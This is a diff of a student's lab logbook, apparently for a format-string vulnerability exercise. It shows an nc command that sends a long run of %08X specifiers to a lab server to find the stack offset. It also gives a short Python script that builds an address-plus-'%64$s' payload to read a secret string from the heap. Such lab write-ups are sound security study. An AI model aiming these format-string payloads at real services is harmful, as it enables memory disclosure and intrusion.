@@ -60,7 +60,7 @@ Then, when we execute the code, our program will read values from the stack that
 
 To find out how many %x format specifiers we need to get the server program to print out the first four bytes of our input, we first used "AAAA" as input that we know is "414141" in hexadecimal.
 
-The idea behind this is giving "ABCD" as input and then concatenate with many "%08x.~
+The idea behind this is giving "AAAA" as input and then concatenate with many "%08x.
 
 ```bash
 $ echo "AAAA%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X" | nc 10.9.0.5 9090
@@ -69,8 +69,33 @@ $ echo "AAAA%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X
 In the server, we get the following output:
 
 
-![Task2A](../docs/week7/taska_a.png)
+![Task2A](../docs/week7/task2_a.png)
 
 The final "41414141" is the string input adress. Between "AAAA" AND "41414141" there are 504 characters, and each adress has 8, so 504/8 = 63 adresses in the stack. We can conclude that to print the first 4 bytes of input is necessary 64 "%x".
 
 # Task 2.B
+
+For this task, we need to print the content of a string that is in the Heap in the adress 0x080b4008.
+
+We created an auxiliar python scrip to insert the 64 "%s".
+
+```
+import sys
+
+content = (0x080b4008).to_bytes(4,byteorder='little') + ("%64$s").encode('latin-1')
+
+# Write the content to badfile
+with open('badfile', 'wb') as f:
+  f.write(content)
+```
+
+We know that by sending a "%s", printf function will read a string from an address. In the previous task, we learned that the number of "%x" needed to get to the beginning of the stack is 64.
+By using the auxiliar script, we inserted the string adress followed by 64 "%s", so the format string can read from the adress and return the hidden message.
+
+By executing the auxiliar scrip we get the following outputs:
+
+![Task2B](../docs/logbook7/task2b_1.png)
+
+![Task2B](../docs/logbook7/task2b_2.png)
+
+The secret message is "A secret message".
